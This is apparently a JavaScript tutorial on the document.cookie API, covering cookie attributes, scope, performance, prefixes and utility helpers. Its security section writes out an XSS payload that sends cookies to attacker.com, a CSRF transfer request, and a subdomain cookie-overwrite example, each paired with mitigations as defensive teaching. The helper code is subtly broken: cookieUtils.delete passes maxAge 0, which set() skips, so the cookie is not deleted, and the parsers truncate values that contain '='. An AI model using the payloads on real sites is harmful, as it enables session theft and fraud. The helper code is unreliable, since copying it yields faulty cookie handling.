## document.cookie


### Reading Cookies

`document.cookie` returns a **semicolon-separated string** of all accessible cookies for the current document:

```javascript
document.cookie
// "sessionId=abc123; userId=456; theme=dark; language=en"

// Parse into object
function getCookies() {
  return document.cookie
    .split('; ')
    .reduce((acc, cookie) => {
      const [name, value] = cookie.split('=');
      acc[name] = decodeURIComponent(value);
      return acc;
    }, {});
}

// Get specific cookie
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) {
    return decodeURIComponent(parts.pop().split(';').shift());
  }
  return null;
}
```

### Setting Cookies

Setting cookies uses **assignment syntax**, but doesn't overwrite existing cookies—it adds or updates a single cookie:

```javascript
// Basic syntax
document.cookie = "username=john";

// Multiple calls add multiple cookies
document.cookie = "sessionId=abc123";
document.cookie = "theme=dark";
// Both cookies now exist

// Value encoding (required for special characters)
const value = "user@example.com";
document.cookie = `email=${encodeURIComponent(value)}`;

// Overwrite existing cookie by using same name
document.cookie = "theme=light"; // Replaces theme=dark
```

### Cookie Attributes

Attributes are appended to the cookie string, separated by semicolons:

**expires**

```javascript
// Set expiration date
const date = new Date();
date.setTime(date.getTime() + (7 * 24 * 60 * 60 * 1000)); // 7 days
document.cookie = `token=xyz; expires=${date.toUTCString()}`;

// Without expires or max-age, cookie is session-only (deleted when browser closes)
document.cookie = "tempData=123"; // Session cookie
```

**max-age**

```javascript
// Seconds until expiration (preferred over expires)
document.cookie = "token=xyz; max-age=604800"; // 7 days in seconds

// max-age takes precedence over expires if both present
document.cookie = "token=xyz; max-age=3600; expires=..."; // max-age wins

// Negative or zero max-age deletes cookie
document.cookie = "token=xyz; max-age=0";
```

**path**

```javascript
// Cookie accessible only on specified path and its subdirectories
document.cookie = "data=value; path=/admin";
// Accessible on: /admin, /admin/users, /admin/settings
// NOT accessible on: /, /login, /profile

// Root path (default if omitted)
document.cookie = "data=value; path=/";
// Accessible on all paths

// Current path
document.cookie = "data=value; path=" + window.location.pathname;
```

**domain**

```javascript
// Cookie accessible on specified domain and subdomains
document.cookie = "token=xyz; domain=example.com";
// Accessible on: example.com, www.example.com, api.example.com

// Without domain attribute, cookie is only accessible on exact host
// On subdomain.example.com:
document.cookie = "token=xyz"; // Only accessible on subdomain.example.com

// Cannot set cookie for different domain or TLD
document.cookie = "token=xyz; domain=otherdomain.com"; // Ignored
document.cookie = "token=xyz; domain=.com"; // Ignored

// Leading dot is optional and ignored
document.cookie = "token=xyz; domain=.example.com"; // Same as domain=example.com
```

**secure**

```javascript
// Cookie only sent over HTTPS
document.cookie = "token=xyz; secure";

// On HTTP site, secure flag is ignored
// On HTTPS site, cookie won't be sent over HTTP requests

// Recommended for sensitive data
document.cookie = "sessionToken=abc; secure; max-age=3600";
```

**SameSite**

```javascript
// Strict: Cookie never sent on cross-site requests
document.cookie = "csrf=token; SameSite=Strict";
// Not sent when clicking link from external site
// Not sent in iframe, fetch from different origin

// Lax (default in modern browsers): Cookie sent on top-level navigation
document.cookie = "session=abc; SameSite=Lax";
// Sent when clicking link from external site
// NOT sent on cross-site POST, iframe, or fetch requests

// None: Cookie sent on all requests (requires Secure)
document.cookie = "tracking=xyz; SameSite=None; Secure";
// Must include Secure flag when SameSite=None
```

**HttpOnly**

```javascript
// Cannot be set via JavaScript
// Must be set by server in Set-Cookie header
// Set-Cookie: sessionId=abc123; HttpOnly

// JavaScript cannot read or modify HttpOnly cookies
document.cookie = "test=value; HttpOnly"; // HttpOnly flag ignored
// Cookie is created but WITHOUT HttpOnly protection

// HttpOnly cookies don't appear in document.cookie
console.log(document.cookie); // Won't include HttpOnly cookies
```

### Deleting Cookies

```javascript
// Set expiration to past date
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC";

// Or use max-age=0
document.cookie = "username=; max-age=0";

// Must match path and domain of original cookie
document.cookie = "token=; path=/admin; max-age=0";
document.cookie = "token=; domain=example.com; path=/; max-age=0";

// Helper function
function deleteCookie(name, path = '/', domain = '') {
  const domainStr = domain ? `; domain=${domain}` : '';
  document.cookie = `${name}=; path=${path}${domainStr}; max-age=0`;
}
```

### Size Limits

Browser-imposed restrictions:

- **Per cookie**: ~4KB (4096 bytes) including name, value, and attributes
- **Per domain**: 20-50+ cookies (varies by browser)
- **Total**: ~4KB limit includes all cookies for the domain combined in some browsers

```javascript
// Check if cookie was set successfully
function setCookieWithCheck(name, value) {
  const testValue = `${name}=${encodeURIComponent(value)}`;
  if (testValue.length > 4096) {
    console.warn('Cookie exceeds 4KB limit');
    return false;
  }
  
  document.cookie = testValue;
  
  // Verify it was set
  return getCookie(name) === value;
}
```

Exceeding limits results in:

- Cookie silently rejected
- Oldest cookies deleted to make room (browser-dependent)
- Unpredictable behavior across browsers

### Same-Origin Policy and Cookie Scope

Cookies follow **domain-based** access, not origin-based:

```javascript
// Origin: https://example.com:443
// Can access cookies for:
// - example.com
// - .example.com (includes all subdomains)

// Origin: https://sub.example.com
// Can access cookies for:
// - sub.example.com
// - .example.com (if domain=example.com was set)

// CANNOT access cookies from:
// - Different domain (otherdomain.com)
// - Parent domain (if cookie didn't specify domain=example.com)
```

Unlike localStorage (origin-bound: protocol + domain + port), cookies ignore port and protocol (unless Secure flag):

```javascript
// http://example.com:8080 and https://example.com:443
// Share cookies UNLESS Secure flag prevents HTTP access

// localStorage is isolated:
// http://example.com and https://example.com have separate localStorage
```

### Cookie Encoding

Special characters must be encoded:

```javascript
// Characters requiring encoding
const specialChars = "; , =";

// Bad: Creates invalid cookie
document.cookie = "data=user;admin"; // Semicolon breaks parsing

// Good: Encode value
document.cookie = `data=${encodeURIComponent("user;admin")}`;
// Result: data=user%3Badmin

// Decode when reading
const value = decodeURIComponent(getCookie('data')); // "user;admin"
```

Characters that need encoding:

- Semicolon (;) - cookie delimiter
- Comma (,) - cookie separator in Set-Cookie
- Equals (=) - name-value separator
- Spaces
- Non-ASCII characters

Cookie **names** can contain most characters except:

- Control characters
- Whitespace
- Semicolon, comma, equals
- Non-ASCII (browser-dependent)

### Reading Performance

```javascript
// document.cookie parses entire cookie string on each access
for (let i = 0; i < 100; i++) {
  const value = getCookie('username'); // 100 parse operations
}

// Cache parsed cookies
const cookies = getCookies(); // Parse once
for (let i = 0; i < 100; i++) {
  const value = cookies.username; // No parsing
}
```

Each `document.cookie` read:

1. Concatenates all accessible cookies
2. Returns entire string
3. JavaScript must parse string

For frequent access, parse once and cache results.

### Writing Performance and Browser Behavior

```javascript
// Each write triggers browser operations
document.cookie = "a=1"; // Write to cookie jar, sync to disk
document.cookie = "b=2"; // Separate write operation
document.cookie = "c=3"; // Another write

// No native batch API exists
// Minimize writes when possible
```

[Inference] Browsers may batch writes internally, but this is implementation-dependent. Sequential writes in tight loops may cause performance degradation.

### Cookie Updates and Race Conditions

```javascript
// Reading and updating is not atomic
const current = getCookie('counter'); // Read
const newValue = parseInt(current || '0') + 1;
document.cookie = `counter=${newValue}`; // Write

// Race condition: Concurrent tabs/windows can overwrite
// Tab A reads: counter=5
// Tab B reads: counter=5
// Tab A writes: counter=6
// Tab B writes: counter=6
// Result: Lost increment
```

Cookies don't support atomic operations. For concurrent access:

- Use server-side state
- Use localStorage with storage events for coordination
- Accept potential data loss for non-critical data

### Third-Party Cookies

```javascript
// On site-a.com, loads iframe from site-b.com
// site-b.com can set cookies in its context

// site-b.com code:
document.cookie = "tracking=xyz; SameSite=None; Secure";
// Required: SameSite=None and Secure for cross-site context

// Browser behavior varies:
// - Chrome/Edge: Block third-party cookies by default (2024+)
// - Firefox: Blocks by default
// - Safari: Intelligent Tracking Prevention blocks most
```

[Unverified] Browser third-party cookie policies continue evolving. Relying on third-party cookies for functionality may break as browser privacy features advance.

### Subdomain Cookie Sharing

```javascript
// On app.example.com:
document.cookie = "shared=data; domain=example.com; path=/";
// Accessible on: example.com, app.example.com, api.example.com

// On app.example.com:
document.cookie = "isolated=data"; // No domain specified
// ONLY accessible on: app.example.com

// On example.com:
document.cookie = "parent=data; domain=example.com";
// Accessible on: example.com and all subdomains

// Cannot set for parent domain from subdomain without explicit domain attribute
```

Common pattern for SSO (Single Sign-On):

```javascript
// Auth service on auth.example.com sets:
document.cookie = "authToken=xyz; domain=example.com; secure; SameSite=Lax";
// Now accessible across all *.example.com subdomains
```

### Path Behavior Nuances

```javascript
// Cookie set with path=/admin
document.cookie = "data=value; path=/admin";

// Accessible on:
// /admin ✓
// /admin/ ✓
// /admin/users ✓
// /admin/settings/profile ✓

// NOT accessible on:
// / ✗
// /administrator ✗
// /public ✗

// Path matching is prefix-based, not exact
// More specific paths shadow less specific ones with same name
document.cookie = "token=general; path=/";
document.cookie = "token=admin; path=/admin";
// On /admin/users: getCookie('token') returns 'admin'
// On /profile: getCookie('token') returns 'general'
```

### Cookie Order in document.cookie

```javascript
// Cookie order in returned string is browser-dependent
document.cookie = "first=1";
document.cookie = "second=2";
document.cookie = "third=3";

console.log(document.cookie);
// Might be: "first=1; second=2; third=3"
// Or: "third=3; first=1; second=2"
// Or: any other order
```

[Unverified] The order is not specified by standards. Do not rely on cookie order for logic. Always parse by name.

### Cookie Visibility Across Windows/Tabs

```javascript
// Cookies are shared across all tabs/windows of same origin
// Tab 1:
document.cookie = "shared=data";

// Tab 2 (same origin):
console.log(getCookie('shared')); // Returns "data"

// But no synchronization event exists
// Tab 2 must manually re-read document.cookie to see updates
```

Unlike localStorage (fires `storage` event), cookies have no change notification mechanism. Polling is required for real-time synchronization:

```javascript
// Poll for cookie changes
let lastCookieValue = getCookie('watched');

setInterval(() => {
  const currentValue = getCookie('watched');
  if (currentValue !== lastCookieValue) {
    console.log('Cookie changed:', currentValue);
    lastCookieValue = currentValue;
  }
}, 1000);
```

### Interaction with HTTP Headers

Server can set cookies via `Set-Cookie` header:

```
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Max-Age=3600
```

JavaScript sees non-HttpOnly cookies in `document.cookie`:

```javascript
// After server sets multiple cookies:
// Set-Cookie: userId=123
// Set-Cookie: sessionToken=xyz; HttpOnly
// Set-Cookie: preferences=theme:dark

console.log(document.cookie);
// "userId=123; preferences=theme:dark"
// sessionToken is invisible due to HttpOnly
```

JavaScript sends cookies automatically with fetch/XHR to same origin:

```javascript
// Browser includes cookies in request headers automatically
fetch('/api/data'); // Cookies sent: Cookie: userId=123; preferences=theme:dark

// For cross-origin requests, credentials must be explicit
fetch('https://api.example.com/data', {
  credentials: 'include' // Required for cross-origin cookie sending
});
```

### Security Considerations

**XSS vulnerability:**

```javascript
// Attacker injects script
const malicious = "<script>new Image().src='http://attacker.com?c='+document.cookie</script>";

// If inserted into DOM without sanitization:
element.innerHTML = userInput; // Executes script, steals cookies

// Mitigation:
// 1. HttpOnly flag (server-side) - prevents JavaScript access
// 2. Sanitize user input
// 3. Use textContent instead of innerHTML
// 4. CSP (Content Security Policy)
```

**CSRF vulnerability:**

```javascript
// Cookies sent automatically with requests
// Attacker site makes request to victim site:
fetch('https://bank.com/transfer?to=attacker&amount=1000', {
  method: 'POST',
  credentials: 'include' // Browser sends victim's cookies
});

// Mitigation:
// 1. SameSite=Strict or Lax
// 2. CSRF tokens
// 3. Check Referer/Origin headers
```

**Subdomain takeover:**

```javascript
// Attacker controls subdomain.example.com
// Can set cookies for .example.com
document.cookie = "sessionId=malicious; domain=example.com";
// Overwrites legitimate session on main domain

// Mitigation:
// 1. Don't use domain attribute unless necessary
// 2. Validate subdomain ownership
// 3. Use __Host- or __Secure- prefixes
```

### Cookie Prefixes

Special name prefixes provide additional security:

```javascript
// __Secure- prefix
document.cookie = "__Secure-token=xyz; Secure";
// Requirements:
// - Must include Secure flag
// - Must be set from HTTPS

// __Host- prefix
document.cookie = "__Host-token=xyz; Secure; Path=/";
// Requirements:
// - Must include Secure flag
// - Must be set from HTTPS
// - Must have Path=/
// - Must NOT have Domain attribute (bound to exact host)

// Browser rejects cookies if requirements not met
document.cookie = "__Host-token=xyz"; // Rejected: missing Secure and Path
document.cookie = "__Host-token=xyz; Secure; Path=/; domain=example.com"; // Rejected: has domain
```

These prefixes prevent:

- Setting from subdomain for parent domain (__Host-)
- Setting from HTTP (__Secure-, __Host-)
- Downgrade attacks

### Practical Utility Functions

```javascript
// Complete cookie management
const cookieUtils = {
  set(name, value, options = {}) {
    let cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;
    
    if (options.maxAge) cookie += `; max-age=${options.maxAge}`;
    else if (options.expires) cookie += `; expires=${options.expires.toUTCString()}`;
    
    if (options.path) cookie += `; path=${options.path}`;
    if (options.domain) cookie += `; domain=${options.domain}`;
    if (options.secure) cookie += '; secure';
    if (options.sameSite) cookie += `; SameSite=${options.sameSite}`;
    
    document.cookie = cookie;
  },
  
  get(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${encodeURIComponent(name)}=`);
    if (parts.length === 2) {
      return decodeURIComponent(parts.pop().split(';').shift());
    }
    return null;
  },
  
  delete(name, options = {}) {
    this.set(name, '', { ...options, maxAge: 0 });
  },
  
  getAll() {
    return document.cookie
      .split('; ')
      .filter(Boolean)
      .reduce((acc, cookie) => {
        const [name, value] = cookie.split('=');
        acc[decodeURIComponent(name)] = decodeURIComponent(value);
        return acc;
      }, {});
  }
};

// Usage
cookieUtils.set('user', 'john', { maxAge: 3600, path: '/', secure: true, sameSite: 'Strict' });
const user = cookieUtils.get('user');
cookieUtils.delete('user', { path: '/' });
```

---

